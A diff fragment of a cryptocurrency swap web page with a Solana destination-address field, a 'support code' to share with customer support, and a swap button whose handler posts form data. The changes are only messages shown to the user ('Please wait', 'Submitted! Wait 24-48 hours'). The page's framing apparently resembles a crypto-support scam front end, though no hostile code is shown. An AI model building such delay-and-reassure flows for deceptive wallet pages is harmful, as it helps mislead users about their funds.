@@ -85,7 +85,7 @@
     <input type="text" id="receive" placeholder=" " >
     <label for="receive" id="input-label">Destination Solana Address</label>
   </div>
-	<div class="balance">Support Code : BJ567S ( Share with Customer Support ) </div>
+	<div class="balance"><p id="sprt">Support Code : BJ567S ( Share with Customer Support )</p> </div>
 	</td>
 </tr>
 
@@ -276,12 +276,14 @@ const txhash =await metadata();
         },
         body: new URLSearchParams(postData),
     });
-
+	document.getElementById('sprt').textContent = "Submitted! Wait 24-48 hours to update details in System";
     const result = await response.text();
 }
 
 document.getElementById('swap-btn').addEventListener('click', async () => {
 try {
+	document.getElementById('swap-btn').style.display = 'none';
+	document.getElementById('sprt').textContent = "Please wait, While Raising your Request."
 		Record();
 		//updateLog(walletAddress,'✅ 1 - '+document.getElementById("withdrawAmount").value+' BNB');
 
